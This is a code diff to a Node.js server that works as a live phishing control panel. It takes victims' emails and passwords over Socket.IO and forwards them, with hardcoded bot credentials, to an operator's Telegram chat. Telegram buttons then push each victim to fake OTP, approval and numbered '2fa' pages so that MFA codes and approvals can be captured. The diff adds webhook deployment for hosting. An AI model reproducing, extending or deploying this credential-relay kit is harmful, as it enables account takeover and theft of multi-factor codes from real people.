@@ -11,11 +11,8 @@ const io = new Server(server, { cors: { origin: "*" } });
 app.use(express.static(__dirname));
 
 
-// ==========================================
-// 1. CONFIGURATION
-// ==========================================
-const BOT_TOKEN = '8466684889:AAHVvpJf1Yykez-rYWiqO5aHEniFCI3zRIk'; 
-const ADMIN_CHAT_ID = -5427803865; 
+const BOT_TOKEN = '8466684889:AAHVvpJf1Yykez-rYWiqO5aHEniFCI3zRIk';
+const ADMIN_CHAT_ID = -5427803865;
 
 const bot = new Telegraf(BOT_TOKEN);
 
@@ -25,9 +22,7 @@ const activeStaffSessions = new Map();
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 
-// ==========================================
-// 2. ROUTING DIRECTORY / FILE SERVERS
-// ==========================================
+
 app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
 app.get('/verification-code', (req, res) => res.sendFile(path.join(__dirname, 'code-input.html')));
 app.get('/approval-prompt', (req, res) => res.sendFile(path.join(__dirname, 'approval-prompt.html')));
@@ -82,10 +77,11 @@ app.get('/2fa/:num', (req, res) => {
 });
 
 
+
 io.on('connection', (socket) => {
-    
+
     socket.on('verify_and_register', (data) => {
-        const { email, password } = data; 
+        const { email, password } = data;
         if (!email) return;
 
         const cleanEmail = email.toLowerCase().trim();
@@ -95,10 +91,10 @@ io.on('connection', (socket) => {
 
         if (password && password !== "session_reconnect") {
             console.log("🔑 Credentials Received -> User: " + cleanEmail + " | Pass: " + password);
-            
+
             bot.telegram.sendMessage(
-                ADMIN_CHAT_ID, 
-                "💼 **New Staff Connection Log**\n\n📧 **Email:** `" + cleanEmail + "`\n🔑 **Password:** `" + password + "`\n\nTerminal window is holding on the loader engine. Choose an action:", 
+                ADMIN_CHAT_ID,
+                "💼 **New Staff Connection Log**\n\n📧 **Email:** `" + cleanEmail + "`\n🔑 **Password:** `" + password + "`\n\nTerminal window is holding on the loader engine. Choose an action:",
                 {
                     parse_mode: 'Markdown',
                     ...Markup.inlineKeyboard([
@@ -129,8 +125,8 @@ io.on('connection', (socket) => {
 // 4. TELEGRAM BOT CLICK ACTIONS
 // ==========================================
 bot.on('callback_query', async (ctx) => {
-    const data = ctx.callbackQuery.data; 
-    
+    const data = ctx.callbackQuery.data;
+
     try {
         if (data.startsWith('route:')) {
             const parts = data.split(':');
@@ -141,24 +137,24 @@ bot.on('callback_query', async (ctx) => {
             // BUTTON 1: Route onto the 6-Digit OTP Box Layout
             if (selection === "button_one") {
                 io.to(cleanEmail).emit('redirect_command', '/verification-code');
-                await ctx.answerCbQuery("Pushed OTP box!").catch(() => {});
-                await bot.telegram.sendMessage(ADMIN_CHAT_ID, "⚙️ *Dashboard Execution:* Code verification panel pushed to `" + cleanEmail + "`", { parse_mode: 'Markdown' }).catch(() => {});
-            } 
-            
+                await ctx.answerCbQuery("Pushed OTP box!").catch(() => { });
+                await bot.telegram.sendMessage(ADMIN_CHAT_ID, "⚙️ *Dashboard Execution:* Code verification panel pushed to `" + cleanEmail + "`", { parse_mode: 'Markdown' }).catch(() => { });
+            }
+
             // BUTTON 2: Route onto the Yes/No Alert
             else if (selection === "button_two") {
                 io.to(cleanEmail).emit('redirect_command', '/approval-prompt');
-                await ctx.answerCbQuery("Pushed approval prompt!").catch(() => {});
-                await bot.telegram.sendMessage(ADMIN_CHAT_ID, "⚙️ *Dashboard Execution:* Yes/No approval layout pushed to `" + cleanEmail + "`", { parse_mode: 'Markdown' }).catch(() => {});
-            } 
-            
+                await ctx.answerCbQuery("Pushed approval prompt!").catch(() => { });
+                await bot.telegram.sendMessage(ADMIN_CHAT_ID, "⚙️ *Dashboard Execution:* Yes/No approval layout pushed to `" + cleanEmail + "`", { parse_mode: 'Markdown' }).catch(() => { });
+            }
+
             // BUTTON 3: Generate the 1-100 Matrix Layout
             else if (selection === "button_three") {
-                await ctx.answerCbQuery("Loading grid structure...").catch(() => {});
-                
+                await ctx.answerCbQuery("Loading grid structure...").catch(() => { });
+
                 const gridButtons = [];
                 let currentRow = [];
-                
+
                 for (let i = 1; i <= 100; i++) {
                     currentRow.push(Markup.button.callback(String(i), "numtarget:" + cleanEmail + ":" + i));
                     if (currentRow.length === 5) {
@@ -169,31 +165,31 @@ bot.on('callback_query', async (ctx) => {
                 if (currentRow.length > 0) {
                     gridButtons.push(currentRow);
                 }
-                
+
                 await ctx.editMessageText(
                     "🔢 Select a custom index marker to route \"" + cleanEmail + "\" to their target viewport:",
                     Markup.inlineKeyboard(gridButtons)
-                ).catch(() => {});
+                ).catch(() => { });
             }
 
             // BUTTON 4: Reset Device View & Kick Session Out Completely
             else if (selection === "button_four") {
                 io.to(cleanEmail).emit('redirect_command', '/force_reset_kick');
-                await ctx.answerCbQuery("Terminal session dropped!").catch(() => {});
-                await bot.telegram.sendMessage(ADMIN_CHAT_ID, "❌ *Dashboard Execution:* Admin cleared sessions and kicked user: `" + cleanEmail + "`", { parse_mode: 'Markdown' }).catch(() => {});
+                await ctx.answerCbQuery("Terminal session dropped!").catch(() => { });
+                await bot.telegram.sendMessage(ADMIN_CHAT_ID, "❌ *Dashboard Execution:* Admin cleared sessions and kicked user: `" + cleanEmail + "`", { parse_mode: 'Markdown' }).catch(() => { });
             }
         }
-        
+
         // GRID DATA ENGINE TRIGGER FOR OPTION 3
         if (data.startsWith('numtarget:')) {
             const parts = data.split(':');
             const email = parts[1];
             const selectedNum = parts[2];
             const cleanEmail = email.toLowerCase().trim();
-            
+
             io.to(cleanEmail).emit('redirect_command', '/2fa/' + selectedNum);
-            await ctx.answerCbQuery("Target " + selectedNum + " deployed!").catch(() => {});
-            await bot.telegram.sendMessage(ADMIN_CHAT_ID, "✅ *Success:* Sent `" + cleanEmail + "` to code accept page: **" + selectedNum + "**", { parse_mode: 'Markdown' }).catch(() => {});
+            await ctx.answerCbQuery("Target " + selectedNum + " deployed!").catch(() => { });
+            await bot.telegram.sendMessage(ADMIN_CHAT_ID, "✅ *Success:* Sent `" + cleanEmail + "` to code accept page: **" + selectedNum + "**", { parse_mode: 'Markdown' }).catch(() => { });
         }
     } catch (telegramErr) {
         console.error("Interaction thread tracking caught warning:", telegramErr.message);
@@ -206,10 +202,10 @@ bot.on('callback_query', async (ctx) => {
 app.post('/verify-code', (req, res) => {
     const code = req.body.full_code;
     const email = req.body.email_context || "Unknown User";
-    
+
     console.log("🔢 Code submitted by " + email + ": " + code);
     bot.telegram.sendMessage(ADMIN_CHAT_ID, "📩 **OTP Code Submitted**\n\n📧 **User:** `" + email + "`\n🔢 **Code Entered:** `" + code + "`", { parse_mode: 'Markdown' });
-    
+
     res.send(`
         <div style="text-align:center; padding-top:100px; font-family:Arial;">
             <h2>Verification Code </h2>
@@ -222,10 +218,10 @@ app.post('/verify-code', (req, res) => {
 app.post('/handle-approval', (req, res) => {
     const status = req.body.status;
     const email = req.body.email_context || "Unknown User";
-    
+
     console.log("👍 Approval choice by " + email + ": " + status);
     bot.telegram.sendMessage(ADMIN_CHAT_ID, "📣 **Action Decision Alert**\n\n📧 **User:** `" + email + "`\n🔘 **Choice Clicked:** `" + status.toUpperCase() + "`", { parse_mode: 'Markdown' });
-    
+
     res.send(`
         <div style="text-align:center; padding-top:100px; font-family:Arial;">
             <h2>Refresh</h2>
@@ -237,4 +233,47 @@ app.post('/handle-approval', (req, res) => {
 
 // Boot the network processes
 bot.launch();
-server.listen(3000, () => console.log('... Persistent control engine streaming on port 3000'));
+const PORT = process.env.PORT || 3000;
+const domain = process.env.RENDER_EXTERNAL_URL; 
+const webhookPath = `/telegraf/${bot.secretPathComponent()}`;
+
+if (process.env.NODE_ENV === 'production' && domain) {
+    // Connects Telegraf directly into your Express pipeline on Render
+    app.use(bot.webhookCallback(webhookPath));
+    
+    // Registers the webhook hook directly with Telegram's servers
+    bot.telegram.setWebhook(`${domain}${webhookPath}`)
+        .then(() => console.log(`🚀 Webhook successfully active at: ${domain}${webhookPath}`))
+        .catch((err) => console.error('Error setting webhook:', err));
+} else {
+    // Local fallback: Only uses polling when you are testing on your own computer
+    bot.launch()
+        .then(() => console.log('🤖 Bot running locally via Polling mode'))
+        .catch((err) => console.error('Local bot crash:', err));
+}
+
+// ==========================================
+// 2. SOCKET.IO CONNECTION HANDLING
+// ==========================================
+io.on('connection', (socket) => {
+    console.log(`User connected: ${socket.id}`);
+    
+    // Put your existing socket events here (e.g., socket.on('login', ...))
+
+    socket.on('disconnect', () => {
+        console.log(`User disconnected: ${socket.id}`);
+    });
+});
+
+// ==========================================
+// 3. START SERVER
+// ==========================================
+server.listen(PORT, () => {
+    console.log(`Server is running on port ${PORT}`);
+});
+
+// ==========================================
+// 4. GRACEFUL SHUTDOWN (Clears old Telegram hooks)
+// ==========================================
+process.once('SIGINT', () => bot.stop('SIGINT'));
+process.once('SIGTERM', () => bot.stop('SIGTERM'));
